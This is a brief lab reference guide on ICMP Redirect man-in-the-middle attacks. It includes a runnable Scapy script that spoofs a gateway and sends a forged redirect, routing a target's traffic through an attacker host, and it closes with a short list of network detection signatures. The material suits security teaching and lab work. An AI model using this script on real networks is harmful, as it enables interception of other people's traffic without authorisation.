# ICMP Redirect Attack - Attacker Reference Guide

This folder documents standard ICMP Redirect configurations and theoretical parameters using network tools against a designated private target (e.g., `192.168.56.20`).

## 1. Overview of ICMP Redirects
An ICMP Redirect (Type 5) packet is sent by a router to inform a host that there is a better route available for a specific destination. In an ICMP Redirect attack, the attacker spoofs a router and sends forged ICMP Redirect packets to the target, pointing them to send their traffic through the attacker's IP address (MitM). This maps to **MITRE ATT&CK T1557 (Adversary-in-the-Middle)**.

## 2. Theoretical Tool Syntax (Scapy)
Using python libraries like Scapy, an attacker can craft custom raw packets to generate the redirect request. Below is the theoretical command configuration:

```python
# Launch Python in Scapy context
from scapy.all import *

# Construct an IP header spoofed as the gateway (e.g., 192.168.56.1)
# target IP is 192.168.56.20
ip = IP(src="192.168.56.1", dst="192.168.56.20")

# Construct the ICMP redirect header
# gw specifies the new gateway IP (pointing to attacker, e.g. 192.168.56.10)
icmp = ICMP(type=5, code=1, gw="192.168.56.10")

# Target's supposed destination IP payload (e.g. 8.8.8.8)
target_dest = IP(src="192.168.56.20", dst="8.8.8.8") / UDP()

# Send raw packet
send(ip / icmp / target_dest)
```

## 3. Network Detection Signatures
* Unsolicited ICMP Type 5 packets arriving from IP addresses that do not match the current active default gateway.
* Routing table modifications (visible via `ip route show` or `route -n`) that map target gateways to anomalous MAC interfaces.
* Local kernel block messages logged to `/var/log/syslog` under the header `ICMP REDIRECT ATTEMPT:`.
